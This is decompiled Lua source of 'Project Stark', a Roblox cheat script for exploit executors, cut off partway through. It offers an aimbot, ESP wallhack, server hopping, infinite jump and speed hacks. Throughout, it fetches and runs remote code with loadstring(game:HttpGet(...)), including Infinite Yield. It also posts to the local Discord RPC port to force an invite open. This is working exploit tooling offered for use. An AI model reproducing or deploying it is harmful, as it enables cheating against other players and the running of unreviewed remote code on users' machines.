local v1 = {}
local _ = require
v1["script.lua"] = function()
	local v_u_2 = game:GetService("Players").LocalPlayer:FindFirstChild("Project Stark Key Check")
	local v_u_3 = false
	local function v6(p_u_4)
		pcall(function()
			-- upvalues: (ref) p_u_4
			local v5 = game:GetService("HttpService");
			(syn and syn.request or request)({
				["Url"] = "http://127.0.0.1:6463/rpc?v=1",
				["Method"] = "POST",
				["Headers"] = {
					["Content-Type"] = "application/json",
					["Origin"] = "https://discord.com"
				},
				["Body"] = v5:JSONEncode({
					["cmd"] = "INVITE_BROWSER",
					["args"] = {
						["code"] = p_u_4
					},
					["nonce"] = v5:GenerateGUID(false)
				})
			})
		end)
	end
	local v7 = false
	if true then
		if v_u_2 and v_u_2.Value == true then
			pcall(function()
				-- upvalues: (ref) v_u_2
				v_u_2:Destroy()
				warn("Urbanstorn was here")
			end)
			v7 = true
		else
			pcall(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Main.lua"))()
			end)
			v6("vgYZApyrZC")
		end
	else
		warn("[Project Stark] Key check DISABLED")
		v7 = true
	end
	if v7 then
		local v8 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/UiLib.lua"))():Window("Project Stark\n\225\181\129\226\129\191\226\129\177\225\181\155\225\181\137\202\179\203\162\225\181\131\203\161 \225\180\172\226\129\177\225\181\144\225\181\135\225\181\146\225\181\151 \225\180\172\226\129\191\225\181\136 \225\180\177\203\162\225\181\150", Color3.fromRGB(120, 81, 169))
		local v9 = v8:Tab("Aimbot")
		local v10 = v8:Tab("ESP")
		local v11 = v8:Tab("Crosshair")
		local v_u_12 = v8:Tab("Settings")
		local v_u_13 = game:GetService("UserInputService")
		local v_u_14 = game:GetService("HttpService")
		game:GetService("RunService")
		local _ = workspace.CurrentCamera
		pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Roblox-Functions-Library/main/Library.lua"))()
		end)
		local v_u_15 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/ESP.lua"))()
		local v_u_16 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Aimbot.lua"))()
		local v_u_17 = v_u_15.DeveloperSettings
		local v_u_18 = v_u_15.Settings
		local v_u_19 = v_u_15.Propertiesa or v_u_15.Properties
		local v_u_20 = v_u_19.Crosshair
		local v_u_21 = v_u_20.CenterDot
		local v_u_22 = v_u_16.DeveloperSettings
		local v_u_23 = v_u_16.Settings
		local v_u_24 = v_u_16.FOVSettings
		v_u_18.LoadConfigOnLaunch = false
		v_u_18.Enabled = false
		v_u_20.Enabled = false
		v_u_23.Enabled = false
		local v_u_25 = { "Bottom", "Center", "Mouse" }
		local v_u_26 = {
			"Top",
			"Bottom",
			"Left",
			"Right"
		}
		local function v_u_28(p_u_27)
			-- upvalues: (ref) v_u_13
			pcall(function()
				-- upvalues: (ref) v_u_13, (ref) p_u_27
				v_u_13.MouseIconEnabled = p_u_27
			end)
		end
		local function v34(p29, p30, p_u_31, p_u_32)
			p29:Toggle(p30, function(p33)
				-- upvalues: (ref) p_u_31, (ref) p_u_32
				p_u_31[p_u_32] = p33
			end)
		end
		local function v40(p35, p36, p_u_37, p_u_38)
			if typeof(p_u_37[p_u_38]) == "Color3" then
				p35:Colorpicker(p36, p_u_37[p_u_38], function(p39)
					-- upvalues: (ref) p_u_37, (ref) p_u_38
					p_u_37[p_u_38] = p39
				end)
			end
		end
		local function v47(p41, p42, p43, p44, p45, p46)
			p41:Slider(p42, p43, p44, p45, p46)
		end
		local function v52(p48, p49, p50, p51)
			p48:Dropdown(p49, p50, p51)
		end
		v9:Label("Aimbot Master")
		v34(v9, "Aimbot Enabled", v_u_23, "Enabled")
		v9:Label("Checks")
		v34(v9, "Team Check", v_u_23, "TeamCheck")
		v34(v9, "Alive Check", v_u_23, "AliveCheck")
		v34(v9, "Wall Check", v_u_23, "WallCheck")
		v9:Label("Aimbot Developer Settings")
		v52(v9, "Update Mode", { "RenderStepped", "Stepped", "Heartbeat" }, function(p53)
			-- upvalues: (ref) v_u_22
			v_u_22.UpdateMode = p53
		end)
		v52(v9, "Team Check Option", { "TeamColor", "Team" }, function(p54)
			-- upvalues: (ref) v_u_22
			v_u_22.TeamCheckOption = p54
		end)
		v47(v9, "Rainbow Speed", 5, 30, math.floor((v_u_22.RainbowSpeed or 1) * 10), function(p55)
			-- upvalues: (ref) v_u_22
			v_u_22.RainbowSpeed = p55 / 10
		end)
		v9:Button("Refresh Aimbot", function()
			-- upvalues: (ref) v_u_16
			pcall(function()
				-- upvalues: (ref) v_u_16
				v_u_16.Restart()
			end)
		end)
		v9:Label("Aimbot Properties")
		v34(v9, "Toggle Mode", v_u_23, "Toggle")
		v34(v9, "Offset To Move Direction", v_u_23, "OffsetToMoveDirection")
		v47(v9, "Offset Increment", 1, 30, v_u_23.OffsetIncrement or 15, function(p56)
			-- upvalues: (ref) v_u_23
			v_u_23.OffsetIncrement = p56
		end)
		v47(v9, "Animation Sensitivity (ms)", 0, 100, math.floor((v_u_23.Sensitivity or 0) * 100), function(p57)
			-- upvalues: (ref) v_u_23
			v_u_23.Sensitivity = p57 / 100
		end)
		v47(v9, "mousemoverel Sensitivity", 0, 500, math.floor((v_u_23.Sensitivity2 or 3.5) * 100), function(p58)
			-- upvalues: (ref) v_u_23
			v_u_23.Sensitivity2 = p58 / 100
		end)
		v52(v9, "Lock Mode", { "CFrame", "mousemoverel" }, function(p59)
			-- upvalues: (ref) v_u_23
			v_u_23.LockMode = p59 == "CFrame" and 1 or 2
		end)
		v52(v9, "Lock Part", {
			"Head",
			"HumanoidRootPart",
			"Torso",
			"Left Arm",
			"Right Arm",
			"Left Leg",
			"Right Leg",
			"LeftHand",
			"RightHand",
			"LeftLowerArm",
			"RightLowerArm",
			"LeftUpperArm",
			"RightUpperArm",
			"LeftFoot",
			"LeftLowerLeg",
			"UpperTorso",
			"LeftUpperLeg",
			"RightFoot",
			"RightLowerLeg",
			"LowerTorso",
			"RightUpperLeg"
		}, function(p60)
			-- upvalues: (ref) v_u_23
			v_u_23.LockPart = p60
		end)
		v9:Button("Bind Trigger Key (click then press key/mouse)", function()
			-- upvalues: (ref) v_u_13, (ref) v_u_23
			local v_u_61 = true
			local v_u_62 = nil
			v_u_62 = v_u_13.InputBegan:Connect(function(p63, p64)
				-- upvalues: (ref) v_u_61, (ref) v_u_62, (ref) v_u_23
				if not p64 and v_u_61 then
					v_u_61 = false
					if v_u_62 then
						v_u_62:Disconnect()
					end
					if p63.UserInputType == Enum.UserInputType.MouseButton1 or (p63.UserInputType == Enum.UserInputType.MouseButton2 or p63.UserInputType == Enum.UserInputType.MouseButton3) then
						v_u_23.TriggerKey = p63.UserInputType
					elseif p63.KeyCode ~= Enum.KeyCode.Unknown then
						v_u_23.TriggerKey = p63.KeyCode
					end
				end
			end)
		end)
		local v_u_65 = ""
		v9:Textbox("Player Name (shortened allowed)", true, function(p66)
			-- upvalues: (ref) v_u_65
			v_u_65 = p66
		end)
		v9:Button("Blacklist (Ignore) Player", function()
			-- upvalues: (ref) v_u_16, (ref) v_u_65
			pcall(v_u_16.Blacklist, v_u_16, v_u_65)
			v_u_65 = ""
		end)
		v9:Button("Whitelist Player", function()
			-- upvalues: (ref) v_u_16, (ref) v_u_65
			pcall(v_u_16.Whitelist, v_u_16, v_u_65)
			v_u_65 = ""
		end)
		v9:Label("FOV Circle")
		v34(v9, "FOV Circle Enabled", v_u_24, "Enabled")
		v34(v9, "FOV Circle Visible", v_u_24, "Visible")
		v34(v9, "FOV Circle Filled", v_u_24, "Filled")
		v34(v9, "FOV Rainbow Color", v_u_24, "RainbowColor")
		v34(v9, "FOV Rainbow Outline Color", v_u_24, "RainbowOutlineColor")
		v40(v9, "FOV Color", v_u_24, "Color")
		v40(v9, "FOV Outline Color", v_u_24, "OutlineColor")
		v40(v9, "FOV Locked Color", v_u_24, "LockedColor")
		v47(v9, "FOV Radius", 0, 720, v_u_24.Radius or 90, function(p67)
			-- upvalues: (ref) v_u_24
			v_u_24.Radius = p67
		end)
		v47(v9, "FOV Sides", 3, 60, v_u_24.NumSides or 60, function(p68)
			-- upvalues: (ref) v_u_24
			v_u_24.NumSides = p68
		end)
		v47(v9, "FOV Transparency", 1, 10, math.floor((v_u_24.Transparency or 1) * 10), function(p69)
			-- upvalues: (ref) v_u_24
			v_u_24.Transparency = p69 / 10
		end)
		v47(v9, "FOV Thickness", 1, 5, v_u_24.Thickness or 1, function(p70)
			-- upvalues: (ref) v_u_24
			v_u_24.Thickness = p70
		end)
		v10:Label("ESP Master")
		v34(v10, "ESP Enabled", v_u_18, "Enabled")
		v10:Label("ESP Developer Settings")
		v52(v10, "Update Mode", { "RenderStepped", "Stepped", "Heartbeat" }, function(p71)
			-- upvalues: (ref) v_u_17
			v_u_17.UpdateMode = p71
		end)
		v52(v10, "Team Check Option", { "TeamColor", "Team" }, function(p72)
			-- upvalues: (ref) v_u_17
			v_u_17.TeamCheckOption = p72
		end)
		v47(v10, "Rainbow Speed", 5, 30, math.floor((v_u_17.RainbowSpeed or 1) * 10), function(p73)
			-- upvalues: (ref) v_u_17
			v_u_17.RainbowSpeed = p73 / 10
		end)
		v47(v10, "Width Boundary", 5, 30, math.floor((v_u_17.WidthBoundary or 1.5) * 10), function(p74)
			-- upvalues: (ref) v_u_17
			v_u_17.WidthBoundary = p74 / 10
		end)
		v10:Button("Refresh ESP", function()
			-- upvalues: (ref) v_u_15
			pcall(function()
				-- upvalues: (ref) v_u_15
				v_u_15:Restart()
			end)
		end)
		v10:Label("ESP Settings")
		v34(v10, "Team Check", v_u_18, "TeamCheck")
		v34(v10, "Alive Check", v_u_18, "AliveCheck")
		v34(v10, "Enable Team Colors", v_u_18, "EnableTeamColors")
		v40(v10, "Team Color", v_u_18, "TeamColor")
		v10:Label("ESP Text")
		v34(v10, "ESP Text Enabled", v_u_19.ESP, "Enabled")
		v34(v10, "ESP Rainbow Color", v_u_19.ESP, "RainbowColor")
		v34(v10, "ESP Rainbow Outline Color", v_u_19.ESP, "RainbowOutlineColor")
		v34(v10, "ESP Outline", v_u_19.ESP, "Outline")
		v34(v10, "Display Distance", v_u_19.ESP, "DisplayDistance")
		v34(v10, "Display Health", v_u_19.ESP, "DisplayHealth")
		v34(v10, "Display Name", v_u_19.ESP, "DisplayName")
		v34(v10, "Display DisplayName", v_u_19.ESP, "DisplayDisplayName")
		v34(v10, "Display Tool", v_u_19.ESP, "DisplayTool")
		v40(v10, "ESP Text Color", v_u_19.ESP, "Color")
		v40(v10, "ESP Outline Color", v_u_19.ESP, "OutlineColor")
		v52(v10, "Text Font", {
			"UI",
			"System",
			"Plex",
			"Monospace"
		}, function(p75)
			-- upvalues: (ref) v_u_19
			if Drawing and Drawing.Fonts then
				v_u_19.ESP.Font = Drawing.Fonts[p75]
			end
		end)
		v47(v10, "ESP Text Transparency", 1, 10, math.floor((v_u_19.ESP.Transparency or 1) * 10), function(p76)
			-- upvalues: (ref) v_u_19
			v_u_19.ESP.Transparency = p76 / 10
		end)
		v47(v10, "ESP Font Size", 1, 20, v_u_19.ESP.Size or 14, function(p77)
			-- upvalues: (ref) v_u_19
			v_u_19.ESP.Size = p77
		end)
		v47(v10, "ESP Text Offset", 10, 30, v_u_19.ESP.Offset or 10, function(p78)
			-- upvalues: (ref) v_u_19
			v_u_19.ESP.Offset = p78
		end)
		v10:Label("Tracer")
		v34(v10, "Tracer Enabled", v_u_19.Tracer, "Enabled")
		v34(v10, "Tracer Rainbow Color", v_u_19.Tracer, "RainbowColor")
		v34(v10, "Tracer Outline", v_u_19.Tracer, "Outline")
		v34(v10, "Tracer Rainbow Outline Color", v_u_19.Tracer, "RainbowOutlineColor")
		v40(v10, "Tracer Color", v_u_19.Tracer, "Color")
		v40(v10, "Tracer Outline Color", v_u_19.Tracer, "OutlineColor")
		v52(v10, "Tracer Position", v_u_25, function(p79)
			-- upvalues: (ref) v_u_19, (ref) v_u_25
			v_u_19.Tracer.Position = table.find(v_u_25, p79) or v_u_19.Tracer.Position
		end)
		v47(v10, "Tracer Transparency", 1, 10, math.floor((v_u_19.Tracer.Transparency or 1) * 10), function(p80)
			-- upvalues: (ref) v_u_19
			v_u_19.Tracer.Transparency = p80 / 10
		end)
		v47(v10, "Tracer Thickness", 1, 5, v_u_19.Tracer.Thickness or 1, function(p81)
			-- upvalues: (ref) v_u_19
			v_u_19.Tracer.Thickness = p81
		end)
		v10:Label("Head Dot")
		v34(v10, "Head Dot Enabled", v_u_19.HeadDot, "Enabled")
		v34(v10, "Head Dot Rainbow Color", v_u_19.HeadDot, "RainbowColor")
		v34(v10, "Head Dot Outline", v_u_19.HeadDot, "Outline")
		v34(v10, "Head Dot Rainbow Outline Color", v_u_19.HeadDot, "RainbowOutlineColor")
		v34(v10, "Head Dot Filled", v_u_19.HeadDot, "Filled")
		v40(v10, "Head Dot Color", v_u_19.HeadDot, "Color")
		v40(v10, "Head Dot Outline Color", v_u_19.HeadDot, "OutlineColor")
		v47(v10, "Head Dot Transparency", 1, 10, math.floor((v_u_19.HeadDot.Transparency or 1) * 10), function(p82)
			-- upvalues: (ref) v_u_19
			v_u_19.HeadDot.Transparency = p82 / 10
		end)
		v47(v10, "Head Dot Thickness", 1, 5, v_u_19.HeadDot.Thickness or 1, function(p83)
			-- upvalues: (ref) v_u_19
			v_u_19.HeadDot.Thickness = p83
		end)
		v47(v10, "Head Dot Sides", 3, 30, v_u_19.HeadDot.NumSides or 30, function(p84)
			-- upvalues: (ref) v_u_19
			v_u_19.HeadDot.NumSides = p84
		end)
		v10:Label("Box")
		v34(v10, "Box Enabled", v_u_19.Box, "Enabled")
		v34(v10, "Box Rainbow Color", v_u_19.Box, "RainbowColor")
		v34(v10, "Box Outline", v_u_19.Box, "Outline")
		v34(v10, "Box Rainbow Outline Color", v_u_19.Box, "RainbowOutlineColor")
		v34(v10, "Box Filled", v_u_19.Box, "Filled")
		v40(v10, "Box Color", v_u_19.Box, "Color")
		v40(v10, "Box Outline Color", v_u_19.Box, "OutlineColor")
		v47(v10, "Box Transparency", 1, 10, math.floor((v_u_19.Box.Transparency or 1) * 10), function(p85)
			-- upvalues: (ref) v_u_19
			v_u_19.Box.Transparency = p85 / 10
		end)
		v47(v10, "Box Thickness", 1, 5, v_u_19.Box.Thickness or 1, function(p86)
			-- upvalues: (ref) v_u_19
			v_u_19.Box.Thickness = p86
		end)
		v10:Label("Health Bar")
		v34(v10, "Health Bar Enabled", v_u_19.HealthBar, "Enabled")
		v34(v10, "Health Bar Outline", v_u_19.HealthBar, "Outline")
		v34(v10, "Health Bar Rainbow Outline Color", v_u_19.HealthBar, "RainbowOutlineColor")
		v40(v10, "Health Bar Outline Color", v_u_19.HealthBar, "OutlineColor")
		v47(v10, "Health Bar Blue", 0, 255, v_u_19.HealthBar.Blue or 100, function(p87)
			-- upvalues: (ref) v_u_19
			v_u_19.HealthBar.Blue = p87
		end)
		v52(v10, "Health Bar Position", v_u_26, function(p88)
			-- upvalues: (ref) v_u_19, (ref) v_u_26
			v_u_19.HealthBar.Position = table.find(v_u_26, p88) or v_u_19.HealthBar.Position
		end)
		v47(v10, "Health Bar Transparency", 1, 10, math.floor((v_u_19.HealthBar.Transparency or 1) * 10), function(p89)
			-- upvalues: (ref) v_u_19
			v_u_19.HealthBar.Transparency = p89 / 10
		end)
		v47(v10, "Health Bar Thickness", 1, 5, v_u_19.HealthBar.Thickness or 1, function(p90)
			-- upvalues: (ref) v_u_19
			v_u_19.HealthBar.Thickness = p90
		end)
		v47(v10, "Health Bar Offset", 4, 12, v_u_19.HealthBar.Offset or 4, function(p91)
			-- upvalues: (ref) v_u_19
			v_u_19.HealthBar.Offset = p91
		end)
		v11:Label("Crosshair Master")
		v34(v11, "Crosshair Enabled", v_u_20, "Enabled")
		v11:Toggle("Enable Roblox Cursor", function(p92)
			-- upvalues: (ref) v_u_28
			v_u_28(p92)
		end)
		v11:Label("Crosshair Settings (1 / 2)")
		v34(v11, "Crosshair Rainbow Color", v_u_20, "RainbowColor")
		v34(v11, "Crosshair Rainbow Outline Color", v_u_20, "RainbowOutlineColor")
		v34(v11, "Crosshair T-Style", v_u_20, "TStyled")
		v34(v11, "Crosshair Outline", v_u_20, "Outline")
		v40(v11, "Crosshair Color", v_u_20, "Color")
		v40(v11, "Crosshair Outline Color", v_u_20, "OutlineColor")
		v52(v11, "Crosshair Position", { "Mouse", "Center" }, function(p93)
			-- upvalues: (ref) v_u_20
			v_u_20.Position = p93 == "Mouse" and 1 or 2
		end)
		v47(v11, "Crosshair Size", 1, 24, v_u_20.Size or 12, function(p94)
			-- upvalues: (ref) v_u_20
			v_u_20.Size = p94
		end)
		v47(v11, "Crosshair Gap Size", 0, 24, v_u_20.GapSize or 6, function(p95)
			-- upvalues: (ref) v_u_20
			v_u_20.GapSize = p95
		end)
		v47(v11, "Crosshair Rotation (Degrees)", -180, 180, v_u_20.Rotation or 0, function(p96)
			-- upvalues: (ref) v_u_20
			v_u_20.Rotation = p96
		end)
		v11:Label("Crosshair Settings (2 / 2)")
		v34(v11, "Crosshair Rotate", v_u_20, "Rotate")
		v34(v11, "Crosshair Rotate Clockwise", v_u_20, "RotateClockwise")
		v34(v11, "Crosshair Pulse Gap", v_u_20, "PulseGap")
		v47(v11, "Crosshair Rotation Speed", 1, 20, v_u_20.RotationSpeed or 5, function(p97)
			-- upvalues: (ref) v_u_20
			v_u_20.RotationSpeed = p97
		end)
		v47(v11, "Crosshair Pulsing Step", 0, 24, v_u_20.PulsingStep or 10, function(p98)
			-- upvalues: (ref) v_u_20
			v_u_20.PulsingStep = p98
		end)
		v47(v11, "Crosshair Pulsing Speed", 1, 20, v_u_20.PulsingSpeed or 5, function(p99)
			-- upvalues: (ref) v_u_20
			v_u_20.PulsingSpeed = p99
		end)
		if type(v_u_20.PulsingBounds) == "table" then
			v_u_20.PulsingBounds[1] = v_u_20.PulsingBounds[1] or 4
			v_u_20.PulsingBounds[2] = v_u_20.PulsingBounds[2] or 8
		end
		v47(v11, "Crosshair Pulsing Boundary (Min)", 0, 24, v_u_20.PulsingBounds and (v_u_20.PulsingBounds[1] or 4) or 4, function(p100)
			-- upvalues: (ref) v_u_20
			v_u_20.PulsingBounds[1] = p100
		end)
		v47(v11, "Crosshair Pulsing Boundary (Max)", 0, 24, v_u_20.PulsingBounds and (v_u_20.PulsingBounds[2] or 8) or 8, function(p101)
			-- upvalues: (ref) v_u_20
			v_u_20.PulsingBounds[2] = p101
		end)
		v47(v11, "Crosshair Transparency", 1, 10, math.floor((v_u_20.Transparency or 1) * 10), function(p102)
			-- upvalues: (ref) v_u_20
			v_u_20.Transparency = p102 / 10
		end)
		v47(v11, "Crosshair Thickness", 1, 5, v_u_20.Thickness or 1, function(p103)
			-- upvalues: (ref) v_u_20
			v_u_20.Thickness = p103
		end)
		v11:Label("Center Dot")
		v34(v11, "Center Dot Enabled", v_u_21, "Enabled")
		v34(v11, "Center Dot Rainbow Color", v_u_21, "RainbowColor")
		v34(v11, "Center Dot Rainbow Outline Color", v_u_21, "RainbowOutlineColor")
		v34(v11, "Center Dot Filled", v_u_21, "Filled")
		v34(v11, "Center Dot Outline", v_u_21, "Outline")
		v40(v11, "Center Dot Color", v_u_21, "Color")
		v40(v11, "Center Dot Outline Color", v_u_21, "OutlineColor")
		v47(v11, "Center Dot Size / Radius", 2, 8, v_u_21.Radius or 2, function(p104)
			-- upvalues: (ref) v_u_21
			v_u_21.Radius = p104
		end)
		v47(v11, "Center Dot Sides", 3, 30, v_u_21.NumSides or 60, function(p105)
			-- upvalues: (ref) v_u_21
			v_u_21.NumSides = p105
		end)
		v47(v11, "Center Dot Transparency", 1, 10, math.floor((v_u_21.Transparency or 1) * 10), function(p106)
			-- upvalues: (ref) v_u_21
			v_u_21.Transparency = p106 / 10
		end)
		v47(v11, "Center Dot Thickness", 1, 5, v_u_21.Thickness or 1, function(p107)
			-- upvalues: (ref) v_u_21
			v_u_21.Thickness = p107
		end)
		v_u_12:Label("UI")
		v_u_12:Button("Bind UI Toggle Key (click then press key)", function()
			-- upvalues: (ref) v_u_13
			local v_u_108 = true
			local v_u_109 = nil
			v_u_109 = v_u_13.InputBegan:Connect(function(p110, p111)
				-- upvalues: (ref) v_u_108, (ref) v_u_109, (ref) v_u_13
				if not p111 and v_u_108 then
					v_u_108 = false
					if v_u_109 then
						v_u_109:Disconnect()
					end
					local v_u_112 = p110.KeyCode
					if v_u_112 and v_u_112 ~= Enum.KeyCode.Unknown then
						v_u_13.InputBegan:Connect(function(p113, p114)
							-- upvalues: (ref) v_u_112
							local v115 = (not p114 and p113.KeyCode == v_u_112 and true or false) and game:GetService("CoreGui"):FindFirstChild("Library")
							if v115 then
								v115.Enabled = not v115.Enabled
							end
						end)
					end
				end
			end)
		end)
		v_u_12:Button("Unload Script", function()
			-- upvalues: (ref) v_u_15, (ref) v_u_16
			stopEspWallCheck()
			pcall(function()
				-- upvalues: (ref) v_u_15
				v_u_15:Exit()
			end)
			pcall(function()
				-- upvalues: (ref) v_u_16
				v_u_16:Exit()
			end)
			pcall(function()
				local v116 = game:GetService("CoreGui"):FindFirstChild("Library")
				if v116 then
					v116:Destroy()
				end
			end)
		end)
		v_u_12:Label("Profiles")
		local v_u_117 = "PS_AimbotESP_Profiles"
		local function v_u_118()
			-- upvalues: (ref) v_u_117
			pcall(function()
				-- upvalues: (ref) v_u_117
				if not isfolder(v_u_117) then
					makefolder(v_u_117)
				end
			end)
		end
		local function v_u_127()
			-- upvalues: (ref) v_u_117
			local v119 = {}
			local v120, v121 = pcall(function()
				-- upvalues: (ref) v_u_117
				return listfiles(v_u_117)
			end)
			if v120 and v121 then
				local v122, v123, v124 = ipairs(v121)
				while true do
					local v125
					v124, v125 = v122(v123, v124)
					if v124 == nil then
						break
					end
					local v126 = v125:match(v_u_117 .. "/(.-)%.json$")
					if v126 then
						table.insert(v119, v126)
					end
				end
			end
			table.sort(v119)
			return v119
		end
		v_u_118()
		local v_u_128 = nil
		local function v_u_131()
			-- upvalues: (ref) v_u_127, (ref) v_u_12, (ref) v_u_128
			local v129 = v_u_127()
			v_u_12:Dropdown("Configurations", (#v129 <= 0 or not v129) and { "<none>" } or v129, function(p130)
				-- upvalues: (ref) v_u_128
				if p130 == "<none>" or not p130 then
					p130 = nil
				end
				v_u_128 = p130
			end)
		end
		v_u_131()
		local v_u_132 = ""
		v_u_12:Textbox("Configuration Name", true, function(p133)
			-- upvalues: (ref) v_u_132
			v_u_132 = p133
		end)
		local function v_u_140(p134)
			-- upvalues: (ref) v_u_140
			if type(p134) ~= "table" then
				return p134
			end
			local v135, v136, v137 = pairs(p134)
			local v138 = {}
			while true do
				local v139
				v137, v139 = v135(v136, v137)
				if v137 == nil then
					break
				end
				v138[v137] = v_u_140(v139)
			end
			return v138
		end
		local function v_u_141()
			-- upvalues: (ref) v_u_140, (ref) v_u_17, (ref) v_u_18, (ref) v_u_19, (ref) v_u_22, (ref) v_u_23, (ref) v_u_24
			return {
				["ESP_DeveloperSettings"] = v_u_140(v_u_17),
				["ESP_Settings"] = v_u_140(v_u_18),
				["ESP_Properties"] = v_u_140(v_u_19),
				["Aimbot_DeveloperSettings"] = v_u_140(v_u_22),
				["Aimbot_Settings"] = v_u_140(v_u_23),
				["Aimbot_FOV"] = v_u_140(v_u_24)
			}
		end
		local function v_u_148(p142, p143)
			-- upvalues: (ref) v_u_148
			local v144, v145, v146 = pairs(p143)
			while true do
				local v147
				v146, v147 = v144(v145, v146)
				if v146 == nil then
					break
				end
				if type(v147) ~= "table" or type(p142[v146]) ~= "table" then
					p142[v146] = v147
				else
					v_u_148(p142[v146], v147)
				end
			end
		end
		local function v_u_150(p149)
			-- upvalues: (ref) v_u_148, (ref) v_u_17, (ref) v_u_18, (ref) v_u_19, (ref) v_u_22, (ref) v_u_23, (ref) v_u_24
			if p149.ESP_DeveloperSettings then
				v_u_148(v_u_17, p149.ESP_DeveloperSettings)
			end
			if p149.ESP_Settings then
				v_u_148(v_u_18, p149.ESP_Settings)
			end
			if p149.ESP_Properties then
				v_u_148(v_u_19, p149.ESP_Properties)
			end
			if p149.Aimbot_DeveloperSettings then
				v_u_148(v_u_22, p149.Aimbot_DeveloperSettings)
			end
			if p149.Aimbot_Settings then
				v_u_148(v_u_23, p149.Aimbot_Settings)
			end
			if p149.Aimbot_FOV then
				v_u_148(v_u_24, p149.Aimbot_FOV)
			end
		end
		v_u_12:Button("Load Configuration", function()
			-- upvalues: (ref) v_u_128, (ref) v_u_118, (ref) v_u_117, (ref) v_u_14, (ref) v_u_150, (ref) v_u_15, (ref) v_u_16
			if v_u_128 then
				v_u_118()
				local v151 = string.format("%s/%s.json", v_u_117, v_u_128)
				local v152, v_u_153 = pcall(readfile, v151)
				if v152 and v_u_153 then
					local v_u_154 = nil
					pcall(function()
						-- upvalues: (ref) v_u_154, (ref) v_u_14, (ref) v_u_153
						v_u_154 = v_u_14:JSONDecode(v_u_153)
					end)
					if v_u_154 then
						v_u_150(v_u_154)
						pcall(function()
							-- upvalues: (ref) v_u_15
							v_u_15:Restart()
						end)
						pcall(function()
							-- upvalues: (ref) v_u_16
							v_u_16.Restart()
						end)
					end
				end
			end
		end)
		v_u_12:Button("Delete Configuration", function()
			-- upvalues: (ref) v_u_128, (ref) v_u_118, (ref) v_u_117, (ref) v_u_131
			if v_u_128 then
				v_u_118()
				local v_u_155 = string.format("%s/%s.json", v_u_117, v_u_128)
				pcall(function()
					-- upvalues: (ref) v_u_155
					delfile(v_u_155)
				end)
				v_u_131()
			end
		end)
		v_u_12:Button("Save Configuration", function()
			-- upvalues: (ref) v_u_118, (ref) v_u_128, (ref) v_u_132, (ref) v_u_117, (ref) v_u_141, (ref) v_u_14, (ref) v_u_131
			v_u_118()
			local v156 = v_u_128 or v_u_132
			if v156 and v156 ~= "" then
				local v_u_157 = string.format("%s/%s.json", v_u_117, v156)
				local v_u_158 = v_u_141()
				local v159, v_u_160 = pcall(function()
					-- upvalues: (ref) v_u_14, (ref) v_u_158
					return v_u_14:JSONEncode(v_u_158)
				end)
				if v159 and v_u_160 then
					pcall(function()
						-- upvalues: (ref) v_u_157, (ref) v_u_160
						writefile(v_u_157, v_u_160)
					end)
					v_u_131()
				end
			end
		end)
		local v161 = v8:Tab("Extras")
		v161:Button("Admin", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
		end)
		v161:Button("Server Hop", function()
			local v_u_162 = game.PlaceId
			local v_u_163 = {}
			local v_u_164 = ""
			local v_u_165 = os.date("!*t").hour
			if not pcall(function()
				-- upvalues: (ref) v_u_163
				v_u_163 = game:GetService("HttpService"):JSONDecode(readfile("NotSameServers.json"))
			end) then
				table.insert(v_u_163, v_u_165)
				writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(v_u_163))
			end
			function TPReturner()
				-- upvalues: (ref) v_u_164, (ref) v_u_162, (ref) v_u_163, (ref) v_u_165
				local v166
				if v_u_164 ~= "" then
					v166 = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. v_u_162 .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. v_u_164))
				else
					v166 = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. v_u_162 .. "/servers/Public?sortOrder=Asc&limit=100"))
				end
				if v166.nextPageCursor and (v166.nextPageCursor ~= "null" and v166.nextPageCursor ~= nil) then
					v_u_164 = v166.nextPageCursor
				end
				local v167, v168, v169 = pairs(v166.data)
				local v170 = 0
				while true do
					local v171
					v169, v171 = v167(v168, v169)
					if v169 == nil then
						break
					end
					local v172 = true
					local v_u_173 = tostring(v171.id)
					if tonumber(v171.maxPlayers) > tonumber(v171.playing) then
						local v174, v175, v176 = pairs(v_u_163)
						while true do
							local v177
							v176, v177 = v174(v175, v176)
							if v176 == nil then
								break
							end
							if v170 == 0 then
								if tonumber(v_u_165) ~= tonumber(v177) then
									pcall(function()
										-- upvalues: (ref) v_u_163, (ref) v_u_165
										delfile("NotSameServers.json")
										v_u_163 = {}
										table.insert(v_u_163, v_u_165)
									end)
								end
							elseif v_u_173 == tostring(v177) then
								v172 = false
							end
							v170 = v170 + 1
						end
						if v172 == true then
							table.insert(v_u_163, v_u_173)
							wait()
							pcall(function()
								-- upvalues: (ref) v_u_163, (ref) v_u_162, (ref) v_u_173
								writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(v_u_163))
								wait()
								game:GetService("TeleportService"):TeleportToPlaceInstance(v_u_162, v_u_173, game.Players.LocalPlayer)
							end)
							wait(4)
						end
					end
				end
			end
			function Teleport()
				-- upvalues: (ref) v_u_164
				while wait() do
					pcall(function()
						-- upvalues: (ref) v_u_164
						TPReturner()
						if v_u_164 ~= "" then
							TPReturner()
						end
					end)
				end
			end
			Teleport()
		end)
		v161:Button("Anti-Afk - Already Running", function()
			print("Why are you clicking the anti-afk button lmao")
		end)
		v161:Toggle("Infinite Jump", function(p178)
			InfJump = p178
			if InfJumpStarted == nil then
				InfJumpStarted = true
				local v179 = game:GetService("Players").LocalPlayer
				local v180 = v179:GetMouse()
				local v_u_181 = v179.Character:WaitForChild("Humanoid")
				v180.KeyDown:Connect(function(p182)
					-- upvalues: (ref) v_u_181
					if InfJump and p182:byte() == 32 then
						v_u_181:ChangeState("Jumping")
						wait()
						v_u_181:ChangeState("Seated")
					end
				end)
			end
		end)
		local v_u_183 = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed
		v161:Slider("Player Speed", 20, 200, 23, function(p184)
			-- upvalues: (ref) v_u_183
			v_u_183 = p184
